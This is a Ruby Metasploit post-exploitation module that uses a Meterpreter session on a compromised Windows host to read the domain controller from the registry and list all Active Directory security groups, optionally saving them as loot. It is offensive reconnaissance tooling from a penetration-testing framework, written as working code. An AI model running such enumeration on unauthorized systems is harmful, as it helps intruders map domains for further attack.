require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::ExtAPI

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather AD Enumerate Domain Security Groups',
        'Description'   => %q{ This Module will perform an ADSI query and enumerate all Domain Security Groups
          on the domain the host is a member of through a Windows Meterpreter Session.},
        'License'       => BSD_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter']
      ))
    register_options(
      [
        OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
        OptInt.new('MAX_SEARCH', [false, 'Maximum values to retrieve, 0 for all.', 100])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Make sure the extension is loaded.
    if load_extapi
      domain = get_domain
      if (!domain.nil?)

        table = Rex::Ui::Text::Table.new(
          'Indent' => 4,
          'SortIndex' => -1,
          'Width' => 80,
          'Columns' =>
          [
            'Name',
            'DistinguishedName'
          ]
        )

        filter =   '(groupType:1.2.840.113556.1.4.803:=2147483648)'
        query_result = session.extapi.adsi.domain_query(domain,
                                                        filter,
                                                        datastore['MAX_SEARCH'],
                                                        datastore['MAX_SEARCH'],
                                                        ["name", "distinguishedname"]
                                                      )
        query_result[:results].each do |obj|
          table << obj
        end
        table.print
        print_line

        if datastore['STORE_LOOT']
          stored_path = store_loot('ad.groups', 'text/plain', session, table.to_csv)
          print_status("Results saved to: #{stored_path}")
        end

      end
    end
  end

  def get_domain()
    domain = nil
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
      v_name = "DCName"
      domain_dc = registry_getvaldata(subkey, v_name)
    rescue
      print_error("Could not determine if the host is part of a domain.")
      return nil
    end
    if (!domain_dc.nil?)
      # leys parse the information
      dom_info =  domain_dc.split('.')
      domain = dom_info[1].upcase
    else
      print_status "Host is not part of a domain."
    end
    return domain
  end
end